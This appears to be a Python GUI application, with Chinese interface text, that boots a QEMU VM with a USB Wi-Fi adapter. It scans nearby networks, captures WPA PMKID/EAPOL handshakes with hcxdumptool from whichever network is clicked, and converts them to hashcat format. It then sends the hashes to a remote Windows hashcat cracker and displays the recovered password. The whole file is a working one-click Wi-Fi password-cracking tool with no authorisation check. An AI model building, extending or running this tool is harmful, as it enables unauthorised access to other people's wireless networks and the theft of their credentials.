#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Mac WiFi Capture App (double-click GUI)
========================================
Pipeline:
  1. on open -> auto-boot QEMU (Alpine qcow2 + runner-initrd + DWA-160 USB)
  2. CONTINUOUSLY scan + show a live Wi-Fi list (SSID/BSSID/Ch/Signal).
     Click a row -> target auto-fills. Double-click a row -> capture it directly.
  3. capture: hcxdumptool -F full-channel scan (PMKID + EAPOL one-shot)
  4. hcxpcapngtool -> .hc22000 hash -> save local + POST to Windows
  5. Wait for Windows cracker multi-stage result, display password or no-match
No terminal interaction required (this GUI drives everything).
"""
import tkinter as tk
from tkinter import scrolledtext, ttk
import subprocess
import threading
import time
import json
import re
import urllib.request
import os

# ---------- fixed QEMU / VM paths (on the Mac) ----------
QEMU_BIN    = '/opt/homebrew/bin/qemu-system-aarch64'
_HOMEV      = os.path.expanduser('~/vmbuild')

def _pick(*cands):
    for p in cands:
        if os.path.exists(p):
            return p
    return cands[0]

QCOW2       = _pick('/tmp/alpine-root.qcow2', _HOMEV + '/alpine-root.qcow2')
KERNEL      = _pick('/tmp/alpine-boot/boot/vmlinuz-lts',
                    _HOMEV + '/alpine-boot/boot/vmlinuz-lts')
INITRD      = _pick(_HOMEV + '/vmbuild/runner-initrd',
                    '/tmp/vmbuild/runner-initrd',
                    '/tmp/initramfs-custom',
                    _HOMEV + '/initramfs-custom')
RUNNER_MODE = 'runner' in os.path.basename(INITRD)
CH          = 'chroot /newroot ' if RUNNER_MODE else ''
SERIAL_LOG  = '/tmp/vm_app_serial.log'
MON_SOCK    = '/tmp/vm_app_monitor.sock'
SSH_KEY     = os.path.expanduser('~/.ssh/vm_tongbao')

DWA_VENDOR  = '5263'
DWA_PRODUCT = '21874'

# ---------- local offline hash store ----------
LOCAL_DIR   = os.path.expanduser('~/MacCapture/captures')

def local_hash_path(ssid):
    safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid.strip()) or 'wifi'
    date = time.strftime('%Y-%m-%d')
    return os.path.join(LOCAL_DIR, '%s_%s.22000' % (safe, date))

def local_hash_files():
    if not os.path.isdir(LOCAL_DIR):
        return []
    return sorted(os.path.join(LOCAL_DIR, f) for f in os.listdir(LOCAL_DIR) if f.endswith('.22000'))

def freq_to_channel(freq):
    try:
        f = int(freq)
    except Exception:
        return 0
    if f < 2483:
        return max(1, min(13, round((f - 2407) / 5)))
    return max(36, round((f - 5000) / 5))

DEFAULTS = {
    'ssid':       '32H10F',
    'bssid':      'BC:3E:07:01:DC:98',
    'channel':    '1',
    'client':     'BC:61:93:23:BC:3F',
    'duration':   '90',
    'windows_ip': '192.168.1.107',
    'port':       '8766',
}
VM_SSH = ('ssh -i %s -p 2222 -o ConnectTimeout=20 -o StrictHostKeyChecking=no '
          '-o BatchMode=yes root@127.0.0.1' % SSH_KEY)


class MacCaptureApp:
    def __init__(self, root, autostart=True):
        self.root = root
        root.title('Mac WiFi Capture  (DWA-160 → hcxdumptool → hashcat)')
        root.geometry('920x750')
        self.var = {}
        self._scan_paused = threading.Event()
        self._scan_stop   = threading.Event()
        self._autostart   = autostart
        self._checklist = []

        # ===== row 0: status bar =====
        status = tk.Frame(root)
        status.grid(row=0, column=0, columnspan=2, sticky='ew', padx=10, pady=(8, 2))
        self.usb_label = tk.Label(status, text='🔌 USB DWA-160: 🔍 檢查中...', fg='#555555')
        self.usb_label.pack(side='left')
        tk.Button(status, text='🔍 檢查', command=self.on_check_usb).pack(side='left', padx=8)
        self.scan_status = tk.Label(status, text='📡 開機中...', fg='#0066cc', font=('', 10, 'bold'))
        self.scan_status.pack(side='left', padx=8)
        self.result_label = tk.Label(status, text='📭 待命', fg='#555555', font=('', 10, 'bold'))
        self.result_label.pack(side='left', padx=8)

        # ===== row 1: live Wi-Fi list =====
        tree_frame = tk.Frame(root)
        tree_frame.grid(row=1, column=0, columnspan=2, sticky='nsew', padx=10, pady=4)
        self.tree = ttk.Treeview(tree_frame,
                                 columns=('ssid', 'bssid', 'ch', 'sig'),
                                 show='headings', height=12, selectmode='browse')
        self.tree.heading('ssid',  text='SSID')
        self.tree.heading('bssid', text='BSSID')
        self.tree.heading('ch',    text='Ch')
        self.tree.heading('sig',   text='Signal')
        self.tree.column('ssid',  width=200, anchor='w')
        self.tree.column('bssid', width=150, anchor='w')
        self.tree.column('ch',    width=50,  anchor='center')
        self.tree.column('sig',   width=90,  anchor='center')
        sb = ttk.Scrollbar(tree_frame, orient='vertical', command=self.tree.yview)
        self.tree.configure(yscrollcommand=sb.set)
        self.tree.pack(side='left', fill='both', expand=True)
        sb.pack(side='right', fill='y')
        self.tree.bind('<Button-1>', self.on_tree_click)
        self.tree.bind('<Double-1>', self.on_tree_dclick)

        # ===== row 2: target fields =====
        tf = tk.Frame(root)
        tf.grid(row=2, column=0, columnspan=2, sticky='ew', padx=10, pady=2)
        tf.columnconfigure(1, weight=1)
        tf.columnconfigure(3, weight=1)

        def field(key, label, col, row, width=26):
            self.var[key] = tk.StringVar(value=DEFAULTS[key])
            tk.Label(tf, text=label).grid(row=row, column=col, sticky='e', padx=(4, 4), pady=2)
            tk.Entry(tf, textvariable=self.var[key], width=width).grid(
                row=row, column=col + 1, sticky='ew', pady=2, padx=(0, 12))

        field('ssid',    'SSID',         0, 0)
        field('client',  'Client MAC',  2, 0, width=22)
        field('bssid',   'BSSID',        0, 1)
        field('duration','Capture 秒數', 2, 1, width=10)
        field('channel', 'Channel',      0, 2, width=8)
        field('windows_ip', 'Windows IP', 2, 2, width=18)
        self.var['port'] = tk.StringVar(value=DEFAULTS['port'])
        tk.Label(tf, text='Port').grid(row=3, column=2, sticky='e', padx=(4, 4), pady=2)
        tk.Entry(tf, textvariable=self.var['port'], width=10).grid(row=3, column=3, sticky='ew', pady=2, padx=(0, 12))

        # ===== row 3: buttons =====
        bf = tk.Frame(root)
        bf.grid(row=3, column=0, columnspan=2, sticky='ew', padx=10, pady=8)
        self.btn = tk.Button(bf, text='▶  開始抓包+破解（選中的 Wi-Fi）', command=self.start, font=('', 12, 'bold'))
        self.btn.pack(side='left', padx=(0, 10))
        self.btn_scan = tk.Button(bf, text='⏸ 暫停掃描', command=self.on_toggle_scan)
        self.btn_scan.pack(side='left', padx=6)
        tk.Button(bf, text='🔄 重送本機 hash', command=self.resend).pack(side='left', padx=6)
        self.var['resend_file'] = tk.StringVar()
        self.resend_combo = ttk.Combobox(bf, textvariable=self.var['resend_file'],
                                         state='readonly', width=28)
        self.resend_combo.pack(side='left', padx=6)
        self._refresh_resend_combo()

        # ===== row 4: progress checklist =====
        tk.Label(root, text='進度', font=('', 11, 'bold')).grid(
            row=4, column=0, columnspan=2, sticky='w', padx=12)
        self.checklist = tk.Text(root, height=8, width=96, font=('', 10), state='disabled',
                                 bg='#1e1e1e', fg='#00ff88', relief='flat')
        self.checklist.grid(row=5, column=0, columnspan=2, padx=10, pady=2)

        # ===== row 6: result display =====
        self.result_box = tk.Label(root, text='', font=('', 14, 'bold'), fg='#ffffff',
                                   bg='#2d2d2d', pady=8, padx=16, anchor='center')
        self.result_box.grid(row=6, column=0, columnspan=2, padx=10, pady=4)

        # ===== row 7/8: log =====
        tk.Label(root, text='Log（除錯）', font=('', 11, 'bold')).grid(
            row=7, column=0, columnspan=2, sticky='w', padx=12)
        self.log = scrolledtext.ScrolledText(root, height=10, width=96,
                                             bg='#1a1a2e', fg='#cccccc', font=('Courier', 9))
        self.log.grid(row=8, column=0, columnspan=2, padx=10, pady=6)

        root.grid_columnconfigure(0, weight=1)
        root.grid_rowconfigure(1, weight=1)

        self._last_vm = False
        threading.Thread(target=self._status_loop, daemon=True).start()

        self.logline('就緒。DWA-160 插在 Mac；選 Wi-Fi → 雙擊 = 一鍵抓包+破解。')
        _files = local_hash_files()
        if _files:
            self.logline('💾 本機 hash 檔（%s）：%d 個' % (LOCAL_DIR, len(_files)))

        if autostart:
            threading.Thread(target=self._startup, daemon=True).start()

    # ---------- logging ----------
    def logline(self, msg):
        def _append():
            self.log.insert('end', msg + '\n')
            self.log.see('end')
            self.root.update_idletasks()
        try:
            self.root.after(0, _append)
        except Exception:
            pass

    def _set_scan_status(self, text, color='#0066cc'):
        def _do():
            self.scan_status.config(text='📡 ' + text, fg=color)
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    def set_usb_status(self, found):
        def _do():
            if found:
                self.usb_label.config(text='🔌 DWA-160: ✅ 已偵測', fg='#1a7f1a')
            else:
                self.usb_label.config(text='🔌 DWA-160: ❌ 沒偵測到', fg='#b02020')
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    def _set_checklist(self, items):
        """items = list of (status_char, text) e.g. ('✅','VM 就緒')"""
        def _do():
            self.checklist.config(state='normal')
            self.checklist.delete('1.0', 'end')
            for char, text in items:
                self.checklist.insert('end', '  %s %s\n' % (char, text))
            self.checklist.config(state='disabled')
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    def _set_result_box(self, text, color='#00ff88'):
        def _do():
            self.result_box.config(text=text, fg=color)
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    def _set_result(self, n):
        def _do():
            if n < 0:
                self.result_label.config(text='❌ 抓包失敗', fg='#b02020')
            elif n > 0:
                self.result_label.config(text='✅ 抓到 %d hash' % n, fg='#1a7f1a')
            else:
                self.result_label.config(text='📭 0 hash', fg='#b02020')
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    # ---------- USB detection ----------
    def check_usb(self):
        try:
            r = subprocess.run('ioreg -r -c IOUSBHostDevice', shell=True,
                               capture_output=True, timeout=30)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            found = ('idVendor" = %s' % DWA_VENDOR in out) and \
                    ('idProduct" = %s' % DWA_PRODUCT in out)
            if not found:
                r2 = subprocess.run('system_profiler SPUSBDataType', shell=True,
                                    capture_output=True, timeout=30)
                out2 = (r2.stdout or b'').decode('utf-8', 'replace').lower()
                found = ('148f' in out2) and ('5572' in out2)
            return found
        except Exception:
            return False

    def on_check_usb(self):
        self.usb_label.config(text='🔌 DWA-160: 🔍 檢查中...', fg='#555555')
        def _chk():
            found = self.check_usb()
            self.set_usb_status(found)
            self.logline('🔍 USB: %s' % ('✅ DWA-160' if found else '❌ 沒偵測到'))
        threading.Thread(target=_chk, daemon=True).start()

    def _set_device_status(self, usb, vm):
        def _do():
            if not usb:
                self.usb_label.config(text='🔌 DWA-160: ❌ 掉線', fg='#b02020')
            elif not vm:
                self.usb_label.config(text='🔌 DWA-160: ✅ | wlan0: ⏳', fg='#b08000')
            else:
                self.usb_label.config(text='🔌 DWA-160: ✅ | wlan0: ✅', fg='#1a7f1a')
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    def _status_loop(self):
        prev_usb = None
        n = 0
        while not self._scan_stop.is_set():
            try:
                usb = self.check_usb()
                if prev_usb is not None and usb != prev_usb:
                    if usb:
                        self.logline('🔌 DWA-160 重連')
                    else:
                        self.logline('⚠️ DWA-160 掉線')
                prev_usb = usb
                if usb:
                    if n % 3 == 0:
                        self._last_vm = self.vm_ready(timeout=8)
                    vm = self._last_vm
                else:
                    vm = False
                    self._last_vm = False
                self._set_device_status(usb, vm)
            except Exception:
                pass
            n += 1
            for _ in range(5):
                if self._scan_stop.is_set():
                    break
                time.sleep(1)

    # ---------- VM boot / ready ----------
    def vm_ready(self, timeout=25):
        try:
            r = subprocess.run(
                VM_SSH + ' "%s/usr/sbin/iw dev 2>/dev/null; echo ---; dmesg 2>/dev/null | grep -c \'Firmware detected\'"' % CH,
                shell=True, capture_output=True, timeout=timeout)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            return ('wlan0' in out)
        except Exception:
            return False

    def boot_vm(self):
        missing = [f for f in (QEMU_BIN, QCOW2, KERNEL, INITRD, SSH_KEY) if not os.path.exists(f)]
        if missing:
            for f in missing:
                self.logline('❌ MISSING: %s' % f)
            return False
        self.logline('關閉既有 QEMU ...')
        subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
        time.sleep(2)
        self.logline('啟動 QEMU (runner + DWA-160) ...')
        os.system('rm -f %s %s' % (SERIAL_LOG, MON_SOCK))
        cmd = ('%s -machine virt -cpu cortex-a72 -m 4096 -smp 4 '
               '-drive file=%s,format=qcow2 '
               '-kernel %s -initrd %s -append "console=ttyAMA0" '
               '-chardev file,id=s0,path=%s,append=on -serial chardev:s0 '
               '-netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 '
               '-device virtio-net-pci,netdev=n0 '
               '-device qemu-xhci,id=xhci '
               '-device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 '
               '-display none -monitor unix:%s,server,nowait'
               % (QEMU_BIN, QCOW2, KERNEL, INITRD, SERIAL_LOG, MON_SOCK))
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.logline('runner 模式：等 ~20s sshd ...')
        time.sleep(20)
        for _ in range(40):
            if self.vm_ready():
                self.logline('✅ VM 就緒')
                return True
            time.sleep(3)
        self.logline('⚠️ VM 就緒逾時（繼續）')
        return True

    # ---------- continuous scan ----------
    def _startup(self):
        self.logline('=== 開機：VM + 持續掃描 ===')
        self.on_check_usb()
        if self.boot_vm():
            self._set_scan_status('持續掃描中…', '#1a7f1a')
            self._scan_loop()
        else:
            self._set_scan_status('VM 開機失敗', '#b02020')

    def _scan_loop(self):
        while not self._scan_stop.is_set():
            if self._scan_paused.is_set():
                time.sleep(1)
                continue
            self._set_scan_status('掃描中…', '#b08000')
            aps = self.do_scan()
            if aps:
                self._update_tree(aps)
                self._set_scan_status('%s · %d AP' % (time.strftime('%H:%M:%S'), len(aps)), '#1a7f1a')
            else:
                self._set_scan_status('掃描中（無 AP）', '#b08000')
            for _ in range(5):
                if self._scan_stop.is_set():
                    break
                time.sleep(1)

    def do_scan(self):
        bind = ('mount --bind /proc /newroot/proc 2>/dev/null; '
                'mount --bind /sys /newroot/sys 2>/dev/null; '
                'mount --bind /dev /newroot/dev 2>/dev/null\n') if RUNNER_MODE else ''
        script = (bind +
                  CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
                  CH + 'ifconfig wlan0 up 2>/dev/null\n' +
                  'sleep 1\n' +
                  CH + 'timeout 20 iw dev wlan0 scan 2>&1\n')
        try:
            r = subprocess.run(VM_SSH + ' "sh -s"', input=script.encode(),
                               capture_output=True, timeout=50, shell=True)
            out = (r.stdout or b'').decode('utf-8', 'replace')
            return self.parse_scan(out)
        except Exception as e:
            self._set_scan_status('scan 失敗: %s' % e, '#b02020')
            return []

    @staticmethod
    def parse_scan(out):
        aps, order, cur = {}, [], None
        for raw in out.splitlines():
            ls = raw.strip()
            if ls.startswith('BSS '):
                parts = ls.split()
                if len(parts) >= 2:
                    cur = parts[1].lower()
                    if cur not in aps:
                        aps[cur] = {'ssid': '', 'ch': 0, 'sig': ''}
                        order.append(cur)
            elif ls.startswith('Signal:') and cur:
                toks = ls.split(':', 1)[1].split()
                if toks:
                    aps[cur]['sig'] = toks[0]
            elif ls.startswith('freq:') and cur:
                try:
                    f = int(ls.split(':', 1)[1].split()[0])
                    aps[cur]['ch'] = freq_to_channel(f)
                except Exception:
                    pass
            elif ls.startswith('SSID:') and cur:
                aps[cur]['ssid'] = ls.split(':', 1)[1].strip()
        result = []
        for b in order:
            a = aps[b]
            result.append((a['ssid'] or '(hidden)', b.upper(), str(a['ch']), a['sig']))
        def sigval(x):
            try:
                return float(x[3])
            except Exception:
                return 999.0
        result.sort(key=sigval)
        return result

    def _update_tree(self, aps):
        def _do():
            self.tree.delete(*self.tree.get_children())
            for ssid, bssid, ch, sig in aps:
                self.tree.insert('', 'end', values=(ssid, bssid, ch, sig))
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    def on_tree_click(self, event):
        sel = self.tree.selection()
        if not sel:
            return
        vals = self.tree.item(sel[0])['values']
        if len(vals) >= 3:
            ssid, bssid, ch = vals[0], vals[1], str(vals[2])
            self.var['ssid'].set(ssid)
            self.var['bssid'].set(bssid)
            if ch and ch != '0':
                self.var['channel'].set(ch)
            self.logline('🎯 已選: %s / %s / ch%s' % (ssid, bssid, ch))

    def on_tree_dclick(self, event):
        self.on_tree_click(event)
        self.start()

    def on_toggle_scan(self):
        if self._scan_paused.is_set():
            self._scan_paused.clear()
            self.btn_scan.config(text='⏸ 暫停掃描')
        else:
            self._scan_paused.set()
            self.btn_scan.config(text='▶ 繼續掃描')

    # ---------- local store / post ----------
    def save_local(self, ssid, hash_lines):
        try:
            os.makedirs(LOCAL_DIR, exist_ok=True)
            path = local_hash_path(ssid)
            existing = set()
            if os.path.exists(path):
                with open(path) as f:
                    existing = set(line.strip() for line in f if line.strip())
            new = [h for h in hash_lines if h not in existing]
            if new:
                with open(path, 'a') as f:
                    for h in new:
                        f.write(h + '\n')
            self.logline('💾 存 %d hash（新增 %d）→ %s' % (len(existing) + len(new), len(new), path))
            self._refresh_resend_combo()
            return len(new)
        except Exception as e:
            self.logline('⚠️ 存本機: %r' % e)
            return 0

    def post_hashes(self, hashes, ssid, bssid, wip, port):
        full_hash = '\n'.join(hashes)
        payload = {'hash': full_hash, 'ssid': ssid, 'bssid': bssid.lower()}
        try:
            req = urllib.request.Request(
                'http://%s:%s/api/receive-hash' % (wip, port),
                data=json.dumps(payload).encode(),
                headers={'Content-Type': 'application/json'}, method='POST')
            resp = urllib.request.urlopen(req, timeout=15)
            body = resp.read().decode('utf-8', 'replace')
            self.logline('POST OK: %s' % body[:120])
            return 1
        except Exception as e:
            self.logline('POST FAIL: %s' % e)
            self.logline('→ Windows cracker 可能沒開。hash 已存本機。')
            return 0

    def _refresh_resend_combo(self):
        files = local_hash_files()
        names = ['(全部本機 hash)'] + [os.path.basename(f) for f in files]
        current = self.var['resend_file'].get() if 'resend_file' in self.var else ''
        self.resend_combo['values'] = names
        if current and current in names:
            self.var['resend_file'].set(current)
        else:
            self.var['resend_file'].set(names[0])

    def resend(self):
        wip = self.var['windows_ip'].get().strip()
        port = self.var['port'].get().strip()
        chosen = self.var['resend_file'].get()
        files = local_hash_files()
        if chosen and chosen != '(全部本機 hash)':
            files = [f for f in files if os.path.basename(f) == chosen]
        if not files:
            self.logline('📭 沒有要重送的 hash 檔')
            return
        all_hashes = []
        for fp in files:
            try:
                with open(fp) as f:
                    for line in f:
                        if line.strip():
                            all_hashes.append(line.strip())
            except Exception:
                pass
        seen, uniq = set(), []
        for h in all_hashes:
            if h not in seen:
                seen.add(h)
                uniq.append(h)
        if not uniq:
            self.logline('📭 hash 檔全空')
            return
        ssid = self.var['ssid'].get().strip()
        bssid = self.var['bssid'].get().strip().upper()
        self.logline('🔄 重送 %d hash → %s:%s' % (len(uniq), wip, port))
        posted = self.post_hashes(uniq, ssid, bssid, wip, port)
        self.logline('重送完成 %d/%d' % (posted, len(uniq)))

    # ---------- capture + crack (one-shot) ----------
    def start(self):
        if str(self.btn.cget('state')) == 'disabled':
            self.logline('（進行中，等一下）')
            return
        self.btn.config(state='disabled')
        threading.Thread(target=self.run, daemon=True).start()

    def run(self):
        self._scan_paused.set()
        checklist = []
        try:
            ssid   = self.var['ssid'].get().strip()
            bssid  = self.var['bssid'].get().strip().upper()
            ch     = self.var['channel'].get().strip()
            dur    = int(self.var['duration'].get().strip() or '90')
            wip    = self.var['windows_ip'].get().strip()
            port   = self.var['port'].get().strip()

            self.logline('=== %s (%s) ch%s · %ss hcxdumptool 全域掃描 ===' % (ssid, bssid, ch, dur))
            self._set_result_box('⏳ 開始處理 %s ...' % ssid, '#00aaff')

            # --- Step 1: VM ready ---
            checklist.append(('⏳', '1. VM 就緒 (wlan0 + firmware)'))
            self._set_checklist(checklist)
            if self.vm_ready():
                checklist[0] = ('✅', 'VM 已就緒（沿用）')
            else:
                self.logline('[1] 啟動 VM ...')
                self.boot_vm()
                checklist[0] = ('✅', 'VM 已就緒')
            self._set_checklist(checklist)

            # --- Step 2: hcxdumptool full scan ---
            checklist.append(('⏳', '2. hcxdumptool 全域掃描 (%ds)' % dur))
            self._set_checklist(checklist)
            self.logline('[2] hcxdumptool -F 全域掃描 ...')

            bind = ('mount --bind /proc /newroot/proc 2>/dev/null; '
                    'mount --bind /sys /newroot/sys 2>/dev/null; '
                    'mount --bind /dev /newroot/dev 2>/dev/null\n') if RUNNER_MODE else ''
            vm_script = (
                'set +e\n' +
                bind +
                'rm -f ' + CH + '/tmp/appscan.pcapng ' + CH + '/tmp/appscan.22000 2>/dev/null\n' +
                'ifconfig wlan0 up 2>/dev/null\n' +
                'sleep 5\n' +
                'timeout %d ' % dur +
                CH + 'hcxdumptool -i wlan0 -w /tmp/appscan.pcapng -F -t 7 --rds=2 2>&1 | tail -30\n' +
                'echo "===CONVERT==="\n' +
                CH + 'hcxpcapngtool -o /tmp/appscan.22000 /tmp/appscan.pcapng 2>&1 | tail -5\n' +
                'echo "===HASH==="\n' +
                'cat ' + CH + '/tmp/appscan.22000 2>/dev/null\n' +
                'echo "===END==="\n'
            )
            r = subprocess.run(VM_SSH + ' "sh -s"', input=vm_script.encode(),
                               capture_output=True, timeout=dur + 120, shell=True)
            out = (r.stdout or b'').decode('utf-8', 'replace') + (r.stderr or b'').decode('utf-8', 'replace')
            for line in out.splitlines():
                if any(k in line for k in ['===HASH===', '===END===', '===CONVERT===',
                                           'WPA*', 'PMKID', 'EAPOL', 'hcxpcapngtool',
                                           'packets', 'Packet', 'ESSID', 'hcxdumptool']):
                    self.logline('   ' + line.strip())

            # --- Step 3: parse hashes ---
            checklist.append(('⏳', '3. 解析 hash'))
            self._set_checklist(checklist)
            hash_lines, in_hash = [], False
            for line in out.splitlines():
                if '===HASH===' in line:
                    in_hash = True
                    continue
                if '===END===' in line:
                    in_hash = False
                    continue
                if in_hash and line.strip():
                    hash_lines.append(line.strip())
            n_hash = len(hash_lines)
            self.logline('   抓到 %d 行 hash' % n_hash)
            for h in hash_lines[:6]:
                self.logline('   %s' % (h[:70] + '...' if len(h) > 70 else h))
            if n_hash == 0:
                checklist[2] = ('❌', '0 hash（RX 可能死，需 Mac 重開機）')
            else:
                checklist[2] = ('✅', '%d hash 抓到' % n_hash)
            self._set_result(n_hash)
            self._set_checklist(checklist)

            if n_hash == 0:
                self._set_result_box('❌ 沒抓到 hash — 需 Mac 重開機後重試', '#ff6666')
                self.logline('=== 結束（0 hash）===')
                return

            # --- Step 4: save + POST ---
            checklist.append(('⏳', '4. 存本機 + POST Windows'))
            self._set_checklist(checklist)
            self.save_local(ssid, hash_lines)
            posted = self.post_hashes(hash_lines, ssid, bssid, wip, port)
            if posted > 0:
                checklist[3] = ('✅', 'POST 成功 → %s:%s' % (wip, port))
            else:
                checklist[3] = ('⚠️', 'POST 失敗（Windows 沒開？）')
            self._set_checklist(checklist)

            if posted == 0:
                self._set_result_box('⚠️ Hash 已存本機，但 Windows 沒收到', '#ffaa00')
                self.logline('=== 結束（POST 失敗）===')
                return

            # --- Step 5: wait for Windows cracker result ---
            checklist.append(('⏳', '5. 等待 Windows hashcat 破解...'))
            self._set_checklist(checklist)
            self._set_result_box('⏳ Windows hashcat 破解中...（多階段自動升級）', '#00aaff')
            self.logline('[5] 輪詢 Windows 破解結果...')

            result = self._wait_crack_result(wip, port, timeout=900)
            if result:
                password = result
                checklist[4] = ('🎉', '密碼找到: %s' % password)
                self._set_result_box('🎉 密碼: %s  (%s)' % (password, ssid), '#00ff88')
                self.logline('🎉🎉🎉 密碼: %s' % password)
            else:
                checklist[4] = ('❌', '無匹配（所有階段跑完）')
                self._set_result_box('❌ %s: 無匹配 — 需更多字典/mask' % ssid, '#ff6666')
                self.logline('=== 無匹配 ===')

            self._set_checklist(checklist)
            self.logline('=== 完成 ===')

        except Exception as e:
            self.logline('ERROR: %r' % e)
            self._set_result_box('❌ Error: %s' % e, '#ff6666')
            self._set_result(-1)
        finally:
            self.btn.config(state='normal')
            self._scan_paused.clear()

    def _wait_crack_result(self, wip, port, timeout=900):
        """Poll Windows /api/state until cracking finishes. Returns password or None."""
        start = time.time()
        last_msg = ''
        while time.time() - start < timeout:
            try:
                req = urllib.request.Request('http://%s:%s/api/state' % (wip, port))
                resp = urllib.request.urlopen(req, timeout=10)
                data = json.loads(resp.read().decode())
                status = data.get('status', '')
                msg = data.get('message', '')
                if msg != last_msg:
                    self.logline('   Windows: %s' % msg)
                    last_msg = msg
                if status == 'done':
                    results = data.get('results', [])
                    for r in results:
                        if r and r != 'No match':
                            self.logline('   ✅ 結果: %s' % r)
                            return r
                    return None
                elif status == 'idle':
                    # might be done but reported as idle with results
                    results = data.get('results', [])
                    for r in results:
                        if r and r != 'No match':
                            self.logline('   ✅ 結果: %s' % r)
                            return r
                    # if idle and no results, check message
                    if 'Done' in data.get('message', ''):
                        results = data.get('results', [])
                        for r in results:
                            if r and r != 'No match':
                                return r
                        return None
            except Exception:
                pass
            time.sleep(5)
        self.logline('   ⚠️ 等待逾時 (%ds)' % timeout)
        return None

    def on_close(self):
        self._scan_stop.set()
        subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
        self.root.destroy()


def main():
    root = tk.Tk()
    app = MacCaptureApp(root)
    root.protocol('WM_DELETE_WINDOW', app.on_close)
    root.mainloop()


if __name__ == '__main__':
    main()